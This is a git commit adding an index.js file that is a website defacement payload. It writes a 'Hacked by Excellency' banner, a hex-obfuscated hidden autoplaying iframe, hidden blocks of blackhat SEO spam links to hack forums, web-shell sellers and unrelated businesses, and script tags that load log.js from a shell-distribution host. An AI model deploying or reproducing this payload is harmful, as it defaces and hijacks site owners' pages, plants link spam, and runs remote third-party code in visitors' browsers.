6d599ccfd666c8a7d7433f6f661aa64fe021603d
R00T3D <50521560+myofc1@users.noreply.github.com>
2019-05-13 15:12:02 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,92 @@
+var yazi = '<title>AKINCILAR 0W3D / Siteniz ex oldu</title>
+<html>
+<script type="text/javascript">
+document.write(unescape('%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%0A%3C%69%66%72%61%6D%65%20%77%69%64%74%68%3D%22%31%25%22%20%68%65%69%67%68%74%3D%22%31%22%20%73%63%72%6F%6C%6C%69%6E%67%3D%22%6E%6F%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%22%6E%6F%22%20%61%6C%6C%6F%77%3D%22%61%75%74%6F%70%6C%61%79%22%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%62%30%72%75%37%30%2E%67%69%74%68%75%62%2E%69%6F%2F%73%74%61%72%74%2E%6D%70%33%22%3E%3C%2F%69%66%72%61%6D%65%3E%0A%3C%2F%64%69%76%3E'));
+</script>
+<noscript> Hacked by Excellency https://akincilar.online </noscript>
+<pre>
+ Hacked by Excellency - Turkish Elite Hacker Team 
+</br>
+ ________                                __  __                                               
+|        \                              |  \|  \                                              
+| $$$$$$$$ __    __   _______   ______  | $$| $$  ______   _______    _______  __    __       
+| $$__    |  \  /  \ /       \ /      \ | $$| $$ /      \ |       \  /       \|  \  |  \      
+| $$  \    \$$\/  $$|  $$$$$$$|  $$$$$$\| $$| $$|  $$$$$$\| $$$$$$$\|  $$$$$$$| $$  | $$      
+| $$$$$     >$$  $$ | $$      | $$    $$| $$| $$| $$    $$| $$  | $$| $$      | $$  | $$      
+| $$_____  /  $$$$\ | $$_____ | $$$$$$$$| $$| $$| $$$$$$$$| $$  | $$| $$_____ | $$__/ $$      
+| $$     \|  $$ \$$\ \$$     \ \$$     \| $$| $$ \$$     \| $$  | $$ \$$     \ \$$    $$      
+ \$$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$$ \$$ \$$  \$$$$$$$ \$$   \$$  \$$$$$$$ _\$$$$$$$      
+                                                                              |  \__| $$      
+                                                                               \$$    $$      
+                                                                                \$$$$$$            
+Coming Soon And Everywhere..
+</br>
+---> <a href="https://akincilar.online">https://akincilar.online</a>
+</pre>
+</html>
+﻿<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<a href="http://www.turkhacks.com/" title="hack forum">hack forum</a>
+<a href="https://akincilar.online/" title="hack forum">hack forum</a>
+<a href="http://www.shellerim.org/" title="alfa shell">alfa shell</a>
+<a href="http://www.shellerim.org/" title="recovery shell">recovery shell</a>
+<a href="https://www.shelldownload.net/" rel="dofollow" title="shell">shell</a>
+<a href="https://b0ru70.blogspot.com" title="recovery shell">recovery shell</a>
+<a href="https://ayna-h.com/" title="Mirror zone">Mirror Zone</a>
+<a href="https://www.smmbayi.org/" title="smm bayi">smm bayi</a>
+<a href="https://www.smmbayi.org/" title="smm ana bayi">smm ana bayi</a>
+<a href="http://evilshells.xyz/php/wso-shell/" rel="dofollow" title="wso shell">wso shell</a>
+<a href="https://www.hacklinkseo.in" title="hacklink" rel="dofollow">hacklink</a>
+<a href="https://www.hacklinkseo.in/hacklink-paketleri" title="hacklink paketleri" rel="dofollow">hacklink paketleri</a>
+<a href="https://www.hacklinkseo.in/hacklink-nedir" title="hacklink nedir" rel="dofollow">hacklink nedir</a>
+<a href="https://www.seolink.in/" title="hacklink panel" rel="dofollow">hacklink panel</a>
+</div>
+﻿<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<a href="http://camihalisi.info/" title="cami halısı">cami halısı</a>
+<a href="http://camihalisi.info/" title="cami halıları">cami halıları</a>
+<a href="https://www.metropolhali.com/" title="cami halısı">cami halısı</a>
+<a href="https://www.metropolhali.com/" title="cami halıları">cami halıları</a>
+<a href="https://www.metropolcamihalisi.com/" title="cami halısı">cami halısı</a>
+<a href="https://www.metropolcamihalisi.com/" title="cami halıları">cami halıları</a>
+<a href="https://turkiyecamihalisi.com/" title="Cami Halısı">Cami Halısı</a>
+<a href="https://turkiyecamihalisi.com/" title="Cami Halıları">Cami Halıları</a>
+<a href="https://metropolcamisupurgesi.com/" title="Cami Süpürgesi">Cami Süpürgesi</a>
+</div>
+﻿<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<a href="https://istanbulevdenevenakliyati.com/" title="Evden Eve Nakliyat">Evden Eve Nakliyat</a>
+<a href="https://istanbulevdenevenakliyati.com/" title="istanbul Evden Eve Nakliyat">istanbul Evden Eve Nakliyat</a>
+<a href="https://sehiresnafi.com/" title="istanbul Evden Eve Nakliyat">istanbul Evden Eve Nakliyat</a>
+<a href="https://sehiresnafi.com/" title="Evden Eve Nakliyat">Evden Eve Nakliyat</a>
+<a href="https://www.mngevdenevenakliyat.com/" title="mng Evden Eve Nakliyat">mng Evden Eve Nakliyat</a>
+<a href="https://www.mngevdenevenakliyat.com/" title="Evden Eve Nakliyat">Evden Eve Nakliyat</a>
+<a href="https://evdenevenakliyatciyiz.com/" title="Evden Eve Nakliyat">Evden Eve Nakliyat</a>
+<a href="https://evdenevenakliyatciyiz.com/" title="istanbul Evden Eve Nakliyat">istanbul Evden Eve Nakliyat</a>
+<a href="http://evdenevenakliyatim.net/" title="Evden Eve Nakliyat">Evden Eve Nakliyat</a>
+<a href="http://evdenevenakliyatim.net/" title="istanbul Nakliyat">istanbul Nakliyat</a>
+<a href="http://evdenevenakliyatciniz.com/" title="evden eve nakliyat">evden eve nakliyat</a>
+<a href="http://evdenevenakliyatciniz.com/" title="istanbul evden eve nakliyat">istanbul evden eve nakliyat</a>
+<a href="http://istanbulofistasima.net/" title="istanbul ofis taşıma">istanbul ofis taşıma</a>
+<a href="http://istanbulofistasima.net/" title="ofis taşımacilik">ofis taşımacilik </a>
+<a href="http://istanbulofistasima.net/" title="ofis taşımaciliği">ofis taşımaciliği</a>
+<a href="http://istanbulofistasima.net/" title="taşıma">taşıma</a>
+<a href="http://yurticievdenevenakliyat.net/" title="yurtiçi evden eve nakliyat">yurtiçi evden eve nakliyat</a>
+<a href="http://yurticievdenevenakliyat.net/" title="evden eve nakliyat">evden eve nakliyat</a>
+<a href="http://www.yurticievdenevenakliye.com" title="yurtiçi evden eve nakliyat">yurtiçi evden eve nakliyat</a>
+<a href="http://www.yurticievdenevenakliye.com" title="yurtiçi nakliyat">yurtiçi nakliyat</a>
+</div>
+﻿<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<div style="display: none;">
+<a href="https://www.hacialioglucigkofte.com/" title="çiğköfte">çiğköfte</a>
+<a href="https://www.hacialioglucigkofte.com/" title="çiğköfte bayilik">çiğköfte bayilik</a>  
+<a href="http://www.turkuazpromosyon.com.tr" rel="dofollow" title="promosyon">promosyon</a>
+<a href="http://www.turkuazpromosyon.com.tr" rel="dofollow" title="promosyon ürünleri">promosyon ürünleri</a>
+<a href="https://www.tedajans.com/" title="tasarım">tasarım</a>
+<a href="https://www.tedajans.com/" title="Grafik tasarım">Grafik tasarım</a>
+<a href="https://www.villadizayn.net/" title="prefabrik" target="_blank">prefabrik</a>
+<a href="https://www.villadizayn.net/" title="prefabrik evler" target="_blank">prefabrik evler</a> 
+</div>
+<script src=http://shellerim.org/bot/log.js></script>
+<script src=https://www.shellerim.org/bot/log.js></script>';
+document.write(yazi);
